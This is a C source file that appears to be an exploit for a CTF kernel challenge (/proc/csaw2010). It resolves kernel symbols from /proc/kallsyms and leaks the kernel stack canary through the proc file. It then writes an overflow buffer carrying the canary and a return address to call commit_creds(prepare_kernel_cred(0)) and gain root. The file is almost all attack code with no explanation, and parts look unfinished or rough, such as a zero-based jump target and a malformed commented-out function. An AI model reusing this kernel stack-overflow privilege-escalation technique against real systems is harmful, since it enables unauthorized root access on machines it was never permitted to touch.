#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include "dbg.h"
#include <sys/mman.h>
#include <byteswap.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <limits.h>
#include <inttypes.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/stat.h>

unsigned long
get_symbol(char *name)
{
        FILE *f;
        unsigned long addr;
        char dummy, sname[512];
        int ret = 0;

        f = fopen("/proc/kallsyms", "r");
        if (!f) {
                return 0;
        }

        while (ret != EOF) {
                ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);
                if (ret == 0) {
                        fscanf(f, "%s\n", sname);
                        continue;
                }
                if (!strcmp(name, sname)) {
                        printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
                        return addr;
                }
        }

        return 0;
}

typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

void run_handler(void)
{
  commit_creds(prepare_kernel_cred(0));
  return;
}

/*
unsigned int swap_endianness(unsigned int num){
return ((num>>24)&0xff)) | // move byte 3 to byte 0
                    ((num<<8)&0xff0000)) | // move byte 1 to byte 2
                    ((num>>8)&0xff00)) | // move byte 2 to byte 1
                    ((num<<24)&0xff000000)) ;// byte 0 to byte 3
}
*/

void hexdump(const unsigned char *bin, unsigned int binsz)
{
int i;
  for (i = 0; i < binsz; i++)
  {
       if(i % 10 == 0 && i > 0) printf("\n"); 
       else if(i >0) printf(":");
       printf("%02X", bin[i]);
  }
 printf("\n");
}

int (*kernel_printk)(const char *fmt, ...);

int test_kernel_code(struct file *file, void *vma)
{
  kernel_printk("We are in kernel.\n");
asm(
  "mov     r0, #0\n\t"
  "mov     pc, r0\n\t"
  );
}



int main(void){


    commit_creds =  (int (*)(unsigned long)) get_symbol("commit_creds");
    prepare_kernel_cred = (unsigned long(*)(unsigned long)) get_symbol("prepare_kernel_cred");
    kernel_printk = (int (*)(const char *fmt, ...)) get_symbol("printk");
  unsigned int kernel_buffer_size = 64;
  char buf[82];
  memset(buf, 0, sizeof(buf));
  char kernelStackCanary[4];
  int fd = open("/proc/csaw2010", O_RDWR);
  check(fd >= 0, "Failed to open challenge file");
  lseek(fd, 16, SEEK_CUR);
  int bytes = read(fd, buf, sizeof(buf));
  printf("[+] dumping kernel memory looking for canary\n");
  hexdump(buf,sizeof(buf));
  memcpy(&kernelStackCanary, &buf[32], sizeof(kernelStackCanary));
  printf("Kernel stack canary: \t");
  hexdump(kernelStackCanary,sizeof(kernelStackCanary));
  memset(buf, 0x00, sizeof(buf));
  unsigned int address_of_function = 0x0000000 - 0x4c;
  memcpy(&buf[kernel_buffer_size], kernelStackCanary, sizeof(kernelStackCanary));
  memcpy(&buf[kernel_buffer_size + 8], &address_of_function, sizeof(address_of_function));

 printf("%x\n", (unsigned int) &test_kernel_code);

  hexdump(buf,sizeof(buf));

 sleep(1);
  int written;
  written  = write(fd,buf, sizeof(buf));
  check(written >= 0, "Error writing to proc");

  return 0;
error:
  return -1;
}
